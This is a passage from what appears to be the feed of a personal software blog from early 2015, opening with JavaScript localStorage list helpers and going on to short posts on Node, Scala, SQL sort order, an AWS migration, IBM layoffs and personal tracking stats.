  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isNaN</span><span class="p">(</span><span class="nx">limit</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="nx">limit</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">a</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">a</span><span class="p">));</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">getItems</span><span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="nx">a</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">k</span><span class="p">));</span>
  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">a</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">a</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="p">[];</span>
<span class="p">}</span>

<span class="c1">// Tests/Examples</span>
<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">test_list</span><span class="dl">'</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>

<span class="nx">addItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">test_list</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Dan</span><span class="dl">"</span><span class="p">});</span>
<span class="nx">addItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">test_list</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="dl">"</span><span class="s2">food</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">pizza</span><span class="dl">"</span><span class="p">});</span>
<span class="nx">addItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">test_list</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="dl">"</span><span class="s2">beer</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Newcastle</span><span class="dl">"</span><span class="p">});</span>

<span class="kd">var</span> <span class="nx">l</span> <span class="o">=</span> <span class="nx">getItems</span><span class="p">(</span><span class="dl">'</span><span class="s1">test_list</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Lengths match: </span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">3</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Value 0 matches: </span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">l</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">Dan</span><span class="dl">'</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Value 1 matches: </span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">l</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">food</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">pizza</span><span class="dl">'</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Value 2 matches: </span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">l</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nx">beer</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">Newcastle</span><span class="dl">'</span><span class="p">));</span>

<span class="nx">addItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">test_list</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="dl">"</span><span class="s2">size</span><span class="dl">"</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="mi">2</span><span class="p">);</span>

<span class="nx">l</span> <span class="o">=</span> <span class="nx">getItems</span><span class="p">(</span><span class="dl">'</span><span class="s1">test_list</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">List limit works: </span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">2</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Value 0 matches: </span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">l</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">beer</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">Newcastle</span><span class="dl">'</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Value 1 matches: </span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">l</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">size</span> <span class="o">===</span> <span class="mi">2</span><span class="p">));</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>In praise of the full stack developer</title>
   <link href="http://dangoldin.com/2015/02/23/in-praise-of-the-full-stack-developer/"/>
   <updated>2015-02-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/23/in-praise-of-the-full-stack-developer</id>
   <content:encoded><![CDATA[
<p>I’m a pretty new engineering manager but a philosophy I’ve adopted is to try to have everyone on the team be as full stack as possible. Everyone has their strengths and weaknesses but being able to grasp the entire stack improves code quality and reduces disruption. And it goes beyond technology and into the business and user world too. Understanding how these various components fit together allow you to make smarter decisions and provide the tools to test and verify your code. The other big benefit is that you’re not waiting on anyone and avoid having your flow disrupted by others.</p>

<p>As an example, imagine having an ecommerce website when you get the idea that you want to start tracking the amount of time people are spending mousing over your product images. The goal is to see whether this behavior is correlated with sales which will give you more data to drive an upcoming redesign. Clearly there will be front-end JavaScript involved since that will be triggering the event but there’s also a lot going on behind the scenes. Depending on the number of events you expect to see you can have a wildly different implementation. How do you want to handle multiple mouseovers over the same image? What data do you want to capture? What kind of analysis will you want to run? How will this data be tied back to the sales data? Where will this data be stored? Will there need to be any additional processing to make the data usable? How will you test the data flow? What needs to happen for you to deploy it? How much additional load will this put on the production system?</p>

<p>These questions can all be answered by looping in various people but understanding the business case and the full tech stack makes you more independent and increases the likelihood that the first version will be the final version. In addition to having the necessary language skills, I’d love to see every web engineer know how to set up a VPS from scratch, be comfortable with the command line, have a basic understanding of SQL and databases, and understand the various components of the web and how they fit together.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Lessons from Node</title>
   <link href="http://dangoldin.com/2015/02/22/lessons-from-node/"/>
   <updated>2015-02-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/22/lessons-from-node</id>
   <content:encoded><![CDATA[
<p>I’ve decided to move on from <a href="http://nodejs.org/" target="_blank">Node</a> after messing around with it for the past couple of months. And while the experience is still fresh I wanted to share my thoughts. I’m far from an expert so take all these with a grain of salt.</p>

<ul>
  <li>Node’s powerful and in the right hands can make a developer extremely productive. I was able to write a few simple applications surprisingly quickly given my limited knowledge and I can see why so many opt to use it. At the same time it requires a commitment to the Node-centric way which can be tough depending on your background. JavaScript has functional scope and the benefit of Node depends on an asynchronous approach which can be difficult to write.</li>
  <li>It’s drastically different from writing client side JavaScript. Instead of worrying about supporting multiple browsers you have to write code that’s maintainable and supports a growing number of use cases. This isn’t that much different from any other backend language but came as a surprise to me since I expected it to be somewhat similar to writing front-end code.</li>
  <li>JavaScript is very difficult to write well. Despite (and possibly due to) JavaScript’s pervasiveness it’s tough to find good code. It’s so flexible that it’s easy to get started but that flexibility makes it critical to keep pruning and cleaning your code. Everyone has their own way of writing JavaScript which can be damaging when working as part of a large team on a large application. Many dismiss JavaScript as being an introductory language but a case can be made that it actually requires an expert to do well. Whereas other languages have rules that prevent new developers from making mistakes, JavaScript lets you do whatever you want.</li>
  <li>Testing is paramount. Due to JavaScript’s flexible nature it’s important to test thoroughly. When writing Java I rarely have to worry about typos or scope issues since my IDE will let me know immediately but there’s no such luck with JavaScript. I discovered a ton of issues in my toy applications as soon as I started writing tests.</li>
  <li>Lots of resources to learn about it online. After committing to working on some Node I was able to find a ton of useful examples and resources online. The community is large and there are a ton of useful libraries on npm but it’s tough to identify the best ones. There seem to be multiple versions of every library and for someone new it can be a bit overwhelming trying to pick the right one to use.</li>
</ul>

<p>I enjoyed my experience with Node and learned a ton but it’s style and approach just don’t fit the way I work. JavaScript’s lack of structure makes it difficult for me to imagine using it on large, team-based projects. Of course there are best practices to make it work but that’s something that would need to be part of the engineering culture versus something that’s part of the language itself. Node is great for small, experienced teams who want to get an app up and running quickly but if the application has complex logic or will require a large team to maintain I would opt for a more rigid, higher performance language. I’m biased towards the JVM and have recently picked up Scala as my “experimental” language. The goal is to do a similar post on Scala once I get more experience.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Smarterphones</title>
   <link href="http://dangoldin.com/2015/02/16/smarterphones/"/>
   <updated>2015-02-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/16/smarterphones</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/google-where-you-at.png" width="894" height="444" layout="responsive"/>
</div>

<p>Yesterday I got a reminder of how deep smartphones and tech companies have gotten into our lives. After spending a day volunteering at the <a href="http://www.c4q.nyc/">C4Q</a> office, I got a text from my wife asking me where I was. When I opened the Hangouts app I saw an option to share my current location. This is the first time I’ve seen a contextual behavior in Hangouts. I’ve seen it before in other apps - a Gmail alert telling me I forgot to attach a file when the text has “please find attached” or Google Calendar defaulting to a weekly repetition if I put “weekly” in the meeting title - but this is the first time I’ve seen it happen in Hangouts. Basic contextual behavior is relatively simple to support and can just require a simple word search but it has incredible potential as more and more data gets collected. Our smartphones are with us wherever we go collecting data each step of the way. Right now the behavior is formulaic and standardized but soon enough our phones will act as personal assistants - keeping track of everything in our calendars while understanding everything we have going on. This has the potential to drastically simplify our lives but we may be making a Faustian bargain in the process.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Learning Scala</title>
   <link href="http://dangoldin.com/2015/02/13/learning-scala/"/>
   <updated>2015-02-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/13/learning-scala</id>
   <content:encoded><![CDATA[
<p>Over the past week I’ve been learning Scala. The initial motivation was that our API code is in PHP and in dire need of a rewrite. And since we’ve been rewriting our other critical applications in Java we want to leverage the JVM as much as possible. At the same time, we want to keep the code simple, expressive, and maintable while being fun and easy to write. I’ve heard great things about Scala so decided to give it a shot.</p>

<p>My first step was to install the <a href="https://www.playframework.com/" target="_blank">Play framework</a> and play around with the examples but I quickly discovered that while I could understand and tweak it, I needed a better Scala foundation to actually work on a real project. One of my favorite ways to learn a new language is to go through the Project Euler problems in a new language. The problems are a fun balance between mathematics and computer science and gradually build up in complexity which aligns itself well with the build up in my coding skills. The other big benefit is that solving the problems gives you access to other peoples’ solutions which you can use to improve your code and knowledge. Normally looking at other people’s code isn’t the most impactful but in this case since you’ve already solved the problem you have the background to actually absorb the new patterns and styles.</p>

<p>So far, I’ve found Scala fun and expressive but tend to write it in a Java-like way. I’m definitely seeing significant changes in my style though. The very first solution looks just like Java while the most recent one is definitely functional. The plan is to work on a few more problems this weekend and then take another stab at the Play framework.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>URL redirection app</title>
   <link href="http://dangoldin.com/2015/02/07/url-redirection-app/"/>
   <updated>2015-02-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/07/url-redirection-app</id>
   <content:encoded><![CDATA[
<p>At <a href="http://www.triplelift.com" target="_blank">TripleLift</a>, we’re big fans of the <a href="https://chrome.google.com/webstore/detail/switcheroo-redirector/cnmciclhnghalnpfhhleggldniplelbg?hl=en" target="_blank">Switcheroo</a> plugin and rely on it during development to test new versions of our code. It allows us to override a production hostname with one of our development boxes so we can see how our code works on a live site. So if a production site is referencing a JavaScript file at http://production-environment/script.js we use Switcheroo to have it reference the development file at http://dev-environment/script.js. Unfortunately, it’s only available for Chrome which makes it more difficult to run browser specifics tests on other browsers.</p>

<p>To deal with this problem we came up with a small redirection app that runs locally and is browser agnostic. Instead of entering the desired host to redirect in the extension, you add it to the local <a href="http://en.wikipedia.org/wiki/Hosts_%28file%29" target="_blank">hosts file</a>, mapping it to localhost. This bypasses the DNS lookup and sends all requests to that domain to the locally running server which then serves a redirect to the desired URL. The <a href="https://github.com/dangoldin/redirector" target="_blank">code’s up on GitHub</a> with a readme that should hopefully be easy to follow.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>MySQL vs PostgreSQL sort order</title>
   <link href="http://dangoldin.com/2015/02/01/mysql-vs-postgresql-sort-order/"/>
   <updated>2015-02-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/02/01/mysql-vs-postgresql-sort-order</id>
   <content:encoded><![CDATA[
<p>At <a href="http://triplelift.com" target="_blank">TripleLift</a>, we have a migrations job that copies aggregate data from Redshift to MySQL so it can be accessed along the rest of the transactional data. As part of a test, I tried comparing that the data matched exactly but ran into an issue when exporting the data to select. Namely, to make the comparison as simple as possible I wanted to run the same select query in both tables and compare the results. Unfortunately, the sort order between MySQL and PostgreSQL (what Redshift is based on) acts differently for text fields. PostgreSQL takes case into account while MySQL does not. This has an especially weird results when you have values that contain characters with an ASCII code between the lower and upper case letters: []^-`. It took some research but I discovered that MySQL provides an option to do a case sensitive sort - just add a “BINARY” option before the field name.</p>

<p>The following   queries demonstrate this behavior - all but the BINARY one can run on both MySQL and PostgreSQL.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_table</span> <span class="p">(</span> <span class="n">t</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="p">);</span>

<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">test_table</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">'a'</span><span class="p">),(</span><span class="s1">'b'</span><span class="p">),(</span><span class="s1">'c'</span><span class="p">),(</span><span class="s1">'d'</span><span class="p">),(</span><span class="s1">'e'</span><span class="p">),(</span><span class="s1">'f'</span><span class="p">),(</span><span class="s1">'g'</span><span class="p">),(</span><span class="s1">'h'</span><span class="p">),(</span><span class="s1">'i'</span><span class="p">),(</span><span class="s1">'j'</span><span class="p">),(</span><span class="s1">'k'</span><span class="p">),(</span><span class="s1">'l'</span><span class="p">),(</span><span class="s1">'m'</span><span class="p">),(</span><span class="s1">'n'</span><span class="p">),(</span><span class="s1">'o'</span><span class="p">),(</span><span class="s1">'p'</span><span class="p">),(</span><span class="s1">'q'</span><span class="p">),(</span><span class="s1">'r'</span><span class="p">),(</span><span class="s1">'s'</span><span class="p">),(</span><span class="s1">'t'</span><span class="p">),(</span><span class="s1">'u'</span><span class="p">),(</span><span class="s1">'v'</span><span class="p">),(</span><span class="s1">'w'</span><span class="p">),(</span><span class="s1">'x'</span><span class="p">),(</span><span class="s1">'y'</span><span class="p">),(</span><span class="s1">'z'</span><span class="p">),(</span><span class="s1">'A'</span><span class="p">),(</span><span class="s1">'B'</span><span class="p">),(</span><span class="s1">'C'</span><span class="p">),(</span><span class="s1">'D'</span><span class="p">),(</span><span class="s1">'E'</span><span class="p">),(</span><span class="s1">'F'</span><span class="p">),(</span><span class="s1">'G'</span><span class="p">),(</span><span class="s1">'H'</span><span class="p">),(</span><span class="s1">'I'</span><span class="p">),(</span><span class="s1">'J'</span><span class="p">),(</span><span class="s1">'K'</span><span class="p">),(</span><span class="s1">'L'</span><span class="p">),(</span><span class="s1">'M'</span><span class="p">),(</span><span class="s1">'N'</span><span class="p">),(</span><span class="s1">'O'</span><span class="p">),(</span><span class="s1">'P'</span><span class="p">),(</span><span class="s1">'Q'</span><span class="p">),(</span><span class="s1">'R'</span><span class="p">),(</span><span class="s1">'S'</span><span class="p">),(</span><span class="s1">'T'</span><span class="p">),(</span><span class="s1">'U'</span><span class="p">),(</span><span class="s1">'V'</span><span class="p">),(</span><span class="s1">'W'</span><span class="p">),(</span><span class="s1">'X'</span><span class="p">),(</span><span class="s1">'Y'</span><span class="p">),(</span><span class="s1">'Z'</span><span class="p">),(</span><span class="s1">'0'</span><span class="p">),(</span><span class="s1">'1'</span><span class="p">),(</span><span class="s1">'2'</span><span class="p">),(</span><span class="s1">'3'</span><span class="p">),(</span><span class="s1">'4'</span><span class="p">),(</span><span class="s1">'5'</span><span class="p">),(</span><span class="s1">'6'</span><span class="p">),(</span><span class="s1">'7'</span><span class="p">),(</span><span class="s1">'8'</span><span class="p">),(</span><span class="s1">'9'</span><span class="p">),(</span><span class="s1">'['</span><span class="p">),(</span><span class="s1">'</span><span class="se">\\</span><span class="s1">'</span><span class="p">),(</span><span class="s1">']'</span><span class="p">),(</span><span class="s1">'^'</span><span class="p">),(</span><span class="s1">'_'</span><span class="p">),(</span><span class="s1">'`'</span><span class="p">);</span>

<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">test_table</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">t</span> <span class="k">ASC</span><span class="p">;</span>

<span class="c1">-- MySQL only</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">test_table</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="nb">BINARY</span> <span class="n">t</span> <span class="k">ASC</span><span class="p">;</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Migrating a simple HTTP application on AWS</title>
   <link href="http://dangoldin.com/2015/01/29/migrating-a-simple-http-application-on-aws/"/>
   <updated>2015-01-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/29/migrating-a-simple-http-application-on-aws</id>
   <content:encoded><![CDATA[
<p>A fun little exercise I had to do was rewrite a simple application from Node.js to Netty to fit into the rest of our stack. The rewrite took a couple of days but the deployment and testing was critical to get right so I wanted to share our approach. To provide some context, the application was an HTTP server that handled ~1,000 requests a minute with each request spawning at most three more to pull in more data.</p>

<p>Make it work. Make it right. Make it fast.
The statement is attributed to Kent Beck but I’ve become a huge fan and try to approach all projects with this mindset. In our case, having a product deployment already available made it simple to test. We would just run some production requests against our new code and compare the responses. If they matched then we knew we did the right thing. Note that if you’re on AWS and running an ELB, a simple way of getting HTTP requests without touching any code is through <a href="http://docs.aws.amazon.com/ElasticLoadBalancing/latest/DeveloperGuide/access-log-collection.html" target="_blank">access logs</a>. Amazon will store each of the requests to the ELB to a file on S3 that you can then easy download and parse.</p>

<p>The next step was making sure it could handle the same load as the old application. The first thing was to run a series of <a href="http://httpd.apache.org/docs/2.2/programs/ab.html" target="_blank">Apache benchmarks (ab)</a> so we can get a rough idea of the concurrency and performance on a single request. As part of this test we turned off the caching layer in our application to hobble it as much as possible since if it could handle that, it could handle anything. The final step was using a  script to simulate the requests in the ELB access against the new server and see how it behaved.</p>

<p>The deployment turned out to be the easy part. All we had to do was launch a new server behind a new ELB and swap the DNS record to point to it. We did this for a few short periods before swapping it back so we could do a few final checks before leaving the DNS record pointing to the new ELB. After a couple of days we eliminated the old ELB and instances completely. The chart below shows the transition between the two load balancers.</p>

<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/load-balancer-swap.png" alt="Load balancer swap" width="880" height="426" layout="responsive"/>
</div>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>IBM's rumored layoff</title>
   <link href="http://dangoldin.com/2015/01/26/ibm-s-rumored-layoff/"/>
   <updated>2015-01-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/26/ibm-s-rumored-layoff</id>
   <content:encoded><![CDATA[
<p>Given the <a href="http://www.itworld.com/article/2875112/ibm-is-about-to-get-hit-with-a-massive-reorg-and-layoffs.html" target="_blank">rumor</a> of the massive IBM layoffs I decided to pull some others and see how it compared. Surprisingly, the next highest was also at IBM - but in 1993. On one hand, it’s odd to see this pattern as if they’ve learned nothing. On the other, it’s a sign that they acknowledge the problem and are willing to adapt. Since the 1993 layoff IBM’s stock price increased over 950% and this round may provide another burst.</p>

<p>On a side note, the largest layoffs are available online but I wasn’t able to find a non ad-ridden, non-paginated table so hopefully others find these useful.</p>

<table class="table">
  <thead>
    <tr>
      <th>Number</th>
      <th>Company</th>
      <th>Year</th>
      <th>Layoffs</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>IBM</td>
      <td>1993</td>
      <td>60,000</td>
    </tr>
    <tr>
      <td>2</td>
      <td>Sears</td>
      <td>1993</td>
      <td>50,000</td>
    </tr>
    <tr>
      <td>3</td>
      <td>Citigroup</td>
      <td>2008</td>
      <td>50,000</td>
    </tr>
    <tr>
      <td>4</td>
      <td>General Motors</td>
      <td>2009</td>
      <td>47,000</td>
    </tr>
    <tr>
      <td>5</td>
      <td>AT&amp;T</td>
      <td>1996</td>
      <td>40,000</td>
    </tr>
    <tr>
      <td>6</td>
      <td>Ford</td>
      <td>2002</td>
      <td>35,000</td>
    </tr>
    <tr>
      <td>7</td>
      <td>Boeing</td>
      <td>2001</td>
      <td>31,000</td>
    </tr>
    <tr>
      <td>8</td>
      <td>USPS</td>
      <td>2010</td>
      <td>30,000</td>
    </tr>
    <tr>
      <td>9</td>
      <td>Bank of America</td>
      <td>2011</td>
      <td>30,000</td>
    </tr>
    <tr>
      <td>19</td>
      <td>HP</td>
      <td>2012</td>
      <td>27,000</td>
    </tr>
    <tr>
      <td>11</td>
      <td>Daimler Chrysler</td>
      <td>2001</td>
      <td>26,000</td>
    </tr>
  </tbody>
</table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The changing fidelity of the past</title>
   <link href="http://dangoldin.com/2015/01/25/the-changing-fidelity-of-the-past/"/>
   <updated>2015-01-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/25/the-changing-fidelity-of-the-past</id>
   <content:encoded><![CDATA[
<p>A fun exercise is picking a random day in the past and trying to recreate it using the various tools at our disposal. In my case the most useful ones are my calendars, both personal and work, the photos I took, and Foursquare/Swarm. As long as I was vigilant in documenting the events it’s simple to figure out what I did. We lose a bit of the mystery when we document our lives and we no longer have long discussions trying to recreate events with friends. I don’t know whether this is better or worse but we’ll probably see more and more of this happening. Our phones are already collecting our location and video is becoming increasingly popular. Now we have high fidelity versions of recent events but only vague memories of our childhood. I wonder whether kids that are growing up now will have access to accurate memories of their childhood when they grow up and what the impact will be.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Don't trust client side data</title>
   <link href="http://dangoldin.com/2015/01/24/dont-trust-client-side-data/"/>
   <updated>2015-01-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/24/dont-trust-client-side-data</id>
   <content:encoded><![CDATA[
<p>At <a href="http://triplelift.com/" target="_blank">TripleLift</a>, we collect a variety of data - some on the client side and some on the server side. One thing we’ve learned is that you should never trust or make assumptions about client data, no matter how great your JavaScript is. You will always see odd data coming in and your data processing pipeline needs to be designed to take this into account. In our case, one of our jobs assumed (and the client side code confirmed) that particular events would be unique - this allowed us to write a much simpler query without having to worry about many to many joins. Unfortunately, we saw that the aggregate data didn’t match up with what we saw in the logs and after some investigating we discovered that we were seeing some duplicate rows generated on the client side. Taking a deeper look it turned out that there were some plugins and scripts that were making duplicate requests to our analytics server.</p>

<p>There may be ways to deal with this better on the client side as well as smarter backend logic to deal with potential duplicates but the easiest fix is to just assume you will have messy data and prepare accordingly. In our case it entailed writing more complicated queries that were robust enough to not require clean input. It took a little bit longer to write and design but our pipeline can now handle weird input without impacting the final results. If you’re designing systems that collect and use data from the client you need to make sure your backend code is capable of dealing with the inevitable trash.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Fun with GitHub's map tools</title>
   <link href="http://dangoldin.com/2015/01/18/fun-with-githubs-map-tools/"/>
   <updated>2015-01-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/18/fun-with-githubs-map-tools</id>
   <content:encoded><![CDATA[
<p>After discovering <a href="https://github.com/blog/1772-diffable-more-customizable-maps" target="_blank">GitHub’s map visualization</a> feature I needed to give it a shot on the only GPS dataset I had available, my runs from RunKeeper. Unfortunately, the RunKeeper files were in GPX while GitHub expects either geoson or topjson. A short <a href="https://github.com/dangoldin/map-fun" target="_blank">Python script</a> later and I was able to convert the GPX data into <a href="http://geojson.org/geojson-spec.html" target="_blank">geojson</a>. The other hiccup I encountered was that the generated geojson file was too large for GitHub to visualize. My 232 runs contained 162,071 latitude/longitude pairs which turned into a 4MB file - not massive but large enough for GitHub to refuse to visualize it. The simplest solution was to generate multiple files but that made it impossible to see all my runs on a single map. The other solution was to see if converting to topojson would reduce the file size. That helped but I wasn’t able to find the right balance between compression and quality and ended up with a hybrid approach - two files, one per running year, each in topojson.</p>

<script src="https://embed.github.com/view/geojson/dangoldin/map-fun/master/runs.2013.topo.json"></script>

<script src="https://embed.github.com/view/geojson/dangoldin/map-fun/master/runs.2013.topo.json"></script>

<!-- <script src="https://embed.github.com/view/geojson/dangoldin/map-fun/master/runs.2014.topo.json"></script> -->

<p>The entire process was painless and quick. The geojson format was straightforward to generate and GitHub does a great job rendering it. The entire process took an hour and I had to read the <a href="https://github.com/mbostock/topojson/wiki/Command-Line-Reference" target="_blank">topojson utility docs</a> to figure out how simplification worked. One thing I didn’t get to do was explore GitHub’s map diffs but will try to in the next couple of weeks.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Take the first step</title>
   <link href="http://dangoldin.com/2015/01/17/take-the-first-step/"/>
   <updated>2015-01-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/17/take-the-first-step</id>
   <content:encoded><![CDATA[
<p>Numerous times I’ve procrastinated on doing something convincing myself that it would either take too long or just wasn’t worth doing but more often than not when I finally take the first step I’m able to quickly complete the task. I don’t know why our minds encourage procrastination but I suspect it’s not just me. I’ve been combating this tendency by recognizing that it’s happening and forcing myself to just do something, as simple as it is. A small task typically turns into a series of small tasks in which I’m able to make a significant amount of progress. In fact, there have been numerous times where I’ve even been able to achieve “flow” - despite being hesitant in the first place. It doesn’t seem like much but 10 minutes here and there do add up. Whether it’s coding up a simple feature, doing a quick data analysis, or just jotting down a few ideas, it’s infinitely more valuable than staring at a phone.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2014 stats</title>
   <link href="http://dangoldin.com/2015/01/11/2014-stats/"/>
   <updated>2015-01-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/01/11/2014-stats</id>
   <content:encoded><![CDATA[
<p>At the beginning of last year I decided to do my part of the quantified self movement and started a daily log of how much I’ve slept, my mood during the morning, afternoon, and evening, as well as what I ate and drank. There were a couple of stretches where I forgot to fill in the details and did what I could from memory. My mood also had a pretty big impact on the way I filled in the subjective questions but hopefully it balances out over a year. I tracked the data via a Google spreadsheet and exported it as a CSV in order to analyze it via a <a href="https://gist.github.com/dangoldin/14906d4f863cd83f3008" target="_blank">simple Python script</a>. For now I’ve only pulled some summary stats but will take a deeper look in the next couple of days to examine the distributions and identify any patterns.</p>

<ul>
  <li>After removing days without data, I’m left with 354 days for the year.</li>
  <li>Out of these days, I was in a good mood for the vast majority (89%) with the remaining days a combination of being sick, getting sick, having a sore throat, or being congested.</li>
  <li>I slept an average of 7.15 hours each night with the most being 11 and the least being 3.</li>
  <li>The most popular breakfast items where cheese (53 days), eggs (45), smoothies (32), bagels (25), with the rest being a various combination of fruits and various dinner leftovers.</li>
  <li>Sandwiches were the most popular lunch item (63 days), followed by soup (42), Chipotle burrito bowls (32), salads (28), and Sophie’s (23), a nearby Cuban restaurant. The remainder were food places that hovered around the teens.</li>
  <li>Dinner was a lot more basic. I had salad at almost a third of my meals with the main dishes being dominated by protein: chicken (43 days), fish (33), turkey (20), salmon (16). My favorite starches were potatoes (34), pasta (27), and rice (16).</li>
  <li>I drink too much coffee averaging 1.3 cups a day. The most coffee I’ve had on a single day was 3 cups which happened on 6 days. The goal is to drop this below 1 a day in 2015.</li>
  <li>I drink too much alcohol also averaging 1.25 drinks a day. Beer (259) and wine (143) made up 91% of my drinking with the rest being a combination of mixed drinks, cocktails, and hard liquors. Similar to coffee, I’ll try to drop the average to below 1 a day in 2015.</li>
</ul>

<p>Despite being a simple exercise there’s a lot of interesting information that can help me improve in 2015. By looking at the data more and examining relationships between various fields (mood and drinking, drinking and sleep, etc) I’ll hopefully find even more ways to live healthier and better.</p>

